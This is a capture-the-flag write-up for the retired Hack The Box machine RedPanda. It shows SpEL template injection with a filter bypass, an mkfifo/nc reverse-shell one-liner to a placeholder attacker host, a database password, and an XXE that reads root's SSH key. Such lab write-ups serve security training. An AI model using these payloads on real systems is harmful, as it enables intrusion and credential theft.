# RedPanda

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.170 |
| **Status** | Retired |

## Overview
RedPanda is an Easy Linux machine running a Java Spring Boot "Red Panda Search" web application. The search feature is vulnerable to Server-Side Template Injection (SSTI) via a Spring Expression Language (SpEL) sink, which allows arbitrary Java code execution and grants a shell as `woodenk`. A root-owned cron job runs a Java program that parses XML statistics files, and this program is vulnerable to XXE, which is used to read the root user's private SSH key and log in directly as root.

## Reconnaissance
Nmap showed SSH and a Spring Boot web application on 8080:

```
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu
8080/tcp open  http-proxy
| http-title: Red Panda Search | Made with Spring Boot
```

Gobuster enumeration found `/search`, `/stats`, `/stats/author={woodenk,damian}` and several static image endpoints.

## Enumeration
The `/search?name=` parameter reflected input in a way consistent with a Thymeleaf/SpEL template. Testing showed `$` and `~` were filtered/banned, but the `*{...}` SpEL "selection" syntax was not, allowing SSTI:

```
*{T(java.lang.System).getenv()}
```

URL-encoded and sent to `/search?name=...`, this returned the full process environment, confirming SSTI and revealing that the app runs under user `woodenk` with `SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar` (launched via `sudo` from `root`).

## Foothold
Using nested `T(java.lang.Runtime).getRuntime().exec(...)` calls (building the command character-by-character with `T(java.lang.Character).toString(...)` to bypass the `$`/`~` filters), arbitrary OS commands were executed, e.g. reading `/etc/passwd`. A helper script, `ssti.py`, automates building these payloads and provides an interactive pseudo-shell against `/search`:

```python
python3 ssti.py   # interactive SSTI "shell" over /search
```

A one-liner reverse shell payload (`rev.sh`) was delivered the same way to obtain an actual TTY:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker_ip> 9001 >/tmp/f
```

This gave a shell as `woodenk`.

## Privilege Escalation
Reviewing the running Java application's source (decompiled sources kept under `files/java/`, covering `logparser` and `panda_search`) and the database connection string:

```java
DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```

revealed that a root cron job periodically runs a separate Java "log parser" component that ingests XML statistics files (`export_stats_<user>.xml`) and is vulnerable to XML External Entity (XXE) injection (tracked informally against the bundled `mysql-connector-java`, related to [SNYK-JAVA-MYSQL-1766958](https://security.snyk.io/vuln/SNYK-JAVA-MYSQL-1766958)). By crafting a malicious stats XML file with an external entity pointing at `/root/.ssh/id_rsa` and placing it where the cron job would parse it, the private key contents were exfiltrated inside the resulting output, allowing direct SSH login as root.

## Lessons Learned
- SpEL/Thymeleaf SSTI filters that only blacklist specific characters (`$`, `~`) are easily bypassed using alternate syntax (`*{...}`) and character-code-based string construction.
- Any application accepting XML input should disable external entity resolution (XXE) by default.
- Reviewing what `sudo`/cron jobs run as root: even indirectly, e.g. via environment variables leaked through SSTI: is a valuable enumeration step.

## Tools & References
- `ssti.py`, `rev.sh` (kept in repository), gobuster
- [SNYK-JAVA-MYSQL-1766958 XXE advisory](https://security.snyk.io/vuln/SNYK-JAVA-MYSQL-1766958)
- Decompiled Java source of the vulnerable log parser and search app retained under `files/java/` for reference.
